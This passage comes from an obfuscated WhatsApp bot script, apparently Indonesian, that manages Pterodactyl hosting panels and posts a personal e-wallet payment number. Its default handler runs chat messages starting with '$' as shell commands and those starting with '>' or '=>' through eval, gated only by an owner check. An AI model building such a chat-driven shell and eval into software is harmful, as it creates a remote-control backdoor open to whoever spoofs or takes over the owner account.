                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x579469 = await _0x368805.json();
          if (_0x579469.errors) {
            return _0x1857d0(JSON.stringify(_0x579469.errors[0], null, 2));
          }
          let _0x4a4b73 = _0x579469.attributes;
          var _0x1bd9c5 = "\n*SUCCESSFULLY CREATED ✅*\n*┌ ◦* Username : " + _0x3bcfac.username + "\n*│ ◦* Ram : *" + (_0x1c30f1 == "0" ? "Unlimited" : _0x1c30f1.split("0")[0] + "GB") + "*\n*│ ◦* Cpu : *" + (_0x27773b == "0" ? "Unlimited" : _0x27773b + "%") + "*\n*│ ◦* Disk : *" + (_0x1db868.charAt(0) + "GB") + "*\n*└ ◦* Password : *" + _0x2b891f.toString() + "*\n\n*LOGIN LINK ⬇️*\n" + domain + "\n*SC FREE? MASUK SINI 👇*\n";
          _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x1bd9c5,
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://telegra.ph/file/8be97d7c69f8d2d6e3b46.jpg",
                title: "GABUNG CHANNEL WHATSAPP",
                body: "SCRIPT FREE",
                sourceUrl: "https://whatsapp.com/channel/0029VagTCBr1iUxQVNZbMA3I",
                renderLargerThumbnail: true,
                mediaType: 1
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
        }
        break;
      case "listpanel":
      case "listp":
      case "listserver":
        {
          if (global.apikey.length < 1) {
            return _0x2e8dd7.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          let _0x4f24e4 = await fetch(domain + "/api/application/servers?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x40ddda = await _0x4f24e4.json();
          let _0x449318 = _0x40ddda.data;
          let _0x41c292 = "*🌐 LIST SERVER PANEL BOT*\n\n";
          for (let _0x24050c of _0x449318) {
            let _0xddf5ce = _0x24050c.attributes;
            let _0x64dba0 = await fetch(domain + "/api/client/servers/" + _0xddf5ce.uuid.split`-`[0] + "/resources", {
              method: "GET",
              headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + capikey
              }
            });
            let _0x393336 = await _0x64dba0.json();
            let _0x149969 = _0x393336.attributes ? _0x393336.attributes.current_state : _0xddf5ce.status;
            _0x41c292 += "*┌ ◦* ID Server *" + _0xddf5ce.id + "*\n";
            _0x41c292 += "*│ ◦* Nama Server *" + _0xddf5ce.name + "*\n";
            _0x41c292 += "*│ ◦* Ram *" + (_0xddf5ce.limits.memory == 0 ? "Unlimited" : _0xddf5ce.limits.memory.length > 3 ? _0xddf5ce.limits.memory.toString().charAt(1) + "GB" : _0xddf5ce.limits.memory.toString().charAt(0) + "GB") + "*\n";
            _0x41c292 += "*│ ◦* CPU *" + (_0xddf5ce.limits.cpu == 0 ? "Unlimited" : _0xddf5ce.limits.cpu.toString() + "%") + "*\n";
            _0x41c292 += "*└ ◦* Storage *" + (_0xddf5ce.limits.disk == 0 ? "Unlimited" : _0xddf5ce.limits.disk.length > 3 ? _0xddf5ce.limits.disk.toString().charAt(1) + "GB" : _0xddf5ce.limits.disk.toString().charAt(0) + "GB") + "*\n\n";
          }
          _0x41c292 += " Total Server : *" + _0x40ddda.meta.pagination.count + " Server*";
          await _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x41c292
          }, {
            quoted: _0x2e8dd7
          });
        }
        break;
      case "delpanel":
      case "hapuspanel":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (global.apikey.length < 1) {
            return _0x2e8dd7.reply("Apikey Tidak Ditemukan!");
          }
          if (!_0x4f7636[0]) {
            return _0x2e8dd7.reply(_0x2f69fb("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));
          }
          let _0xa7d3b1 = await fetch(domain + "/api/application/servers?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x198ec0 = await _0xa7d3b1.json();
          let _0x17e734 = _0x198ec0.data;
          let _0x49ec9f = [];
          for (let _0xe015a2 of _0x17e734) {
            let _0x4ef651 = _0xe015a2.attributes;
            if (_0x4f7636[0] == _0x4ef651.id.toString()) {
              _0x49ec9f.push(_0x4ef651.name.toLowerCase());
              let _0x40678a = await fetch(domain + ("/api/application/servers/" + _0x4ef651.id), {
                method: "DELETE",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey
                }
              });
              let _0xc59019 = _0x40678a.ok ? {
                errors: null
              } : await _0x40678a.json();
            }
          }
          let _0x13cf59 = await fetch(domain + "/api/application/users?page=1", {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let _0x5d0e40 = await _0x13cf59.json();
          let _0x154e49 = _0x5d0e40.data;
          for (let _0x59913e of _0x154e49) {
            let _0x6065ec = _0x59913e.attributes;
            if (_0x49ec9f.includes(_0x6065ec.username)) {
              let _0x3fb92f = await fetch(domain + ("/api/application/users/" + _0x6065ec.id), {
                method: "DELETE",
                headers: {
                  Accept: "application/json",
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + apikey
                }
              });
              let _0x360d22 = _0x3fb92f.ok ? {
                errors: null
              } : await _0x3fb92f.json();
            }
          }
          if (_0x49ec9f.length == 0) {
            return _0x2e8dd7.reply("*ID Server/User* Tidak Ditemukan");
          }
          _0x2e8dd7.reply("Berhasil Menghapus Akun Panel *" + _0x515f60(_0x49ec9f[0]) + "*");
        }
        break;

      case "sendpayment":
      case "nope":
      case "qris":
      case "listpayment":
        {
          const _0x14dcf3 = "_Subscribe Yt @Hoedev_ \n *Payment Dana : 085815657097*\n *Payment Gopay :* \n *Payment Ovo :* \n *UNTUK QRIS SCAN DI ATAS YA ✅❤️*\n_Atau Klik link di sini trs ss aja_ : https://l.top4top.io/p_32424an6g1.jpg\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n *• • •「" + _0x5e96be().split("T")[1].split("+")[0] + "」• • •*\n *© powered by dynz official* \n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x14dcf3,
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://l.top4top.io/p_32424an6g1.jpg",
                title: "𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐘 𝐃𝐄𝐀𝐍",
                body: "HALLO @" + _0x2e8dd7.sender.split("@")[0],
                sourceUrl: "https://youtube.com/@hoedev",
                renderLargerThumbnail: true,
                mediaType: 1
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
        }
        break;
      default:
        if (_0x442c6d.startsWith("$")) {
          if (!_0x4a413c) {
            return;
          }
          exec(_0x442c6d.slice(2), (_0x4feada, _0x3e78f4) => {
            if (_0x4feada) {
              return _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
                text: _0x4feada.toString()
              }, {
                quoted: _0x2e8dd7
              });
            }
            if (_0x3e78f4) {
              return _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
                text: util.format(_0x3e78f4)
              }, {
                quoted: _0x2e8dd7
              });
            }
          });
        }
        if (_0x442c6d.startsWith(">")) {
          if (!_0x4a413c) {
            return;
          }
          try {
            let _0x1fb69d = await eval(_0x40c6c7);
            if (typeof _0x1fb69d !== "string") {
              _0x1fb69d = util.inspect(_0x1fb69d);
            }
            _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              text: util.format(_0x1fb69d)
            }, {
              quoted: _0x2e8dd7
            });
          } catch (_0x13563b) {
            _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              text: util.format(_0x13563b)
            }, {
              quoted: _0x2e8dd7
            });
          }
        }
        if (_0x442c6d.startsWith("=>")) {
          if (!_0x4a413c) {
            return;
          }
          try {
            const _0x8c6268 = await eval(";(async () => { " + _0x40c6c7 + " })();");
            return _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              text: util.format(_0x8c6268)
            }, {
              quoted: _0x2e8dd7
            });
          } catch (_0x979ab4) {
            return _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              text: util.format(_0x979ab4)
            }, {
              quoted: _0x2e8dd7
            });
          }
        }
    }
  } catch (_0x2043dc) {
    console.log(_0x2043dc);
    _0xb3bbc5.sendMessage(owner + "@s.whatsapp.net", {
      text: "" + util.format(_0x2043dc)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});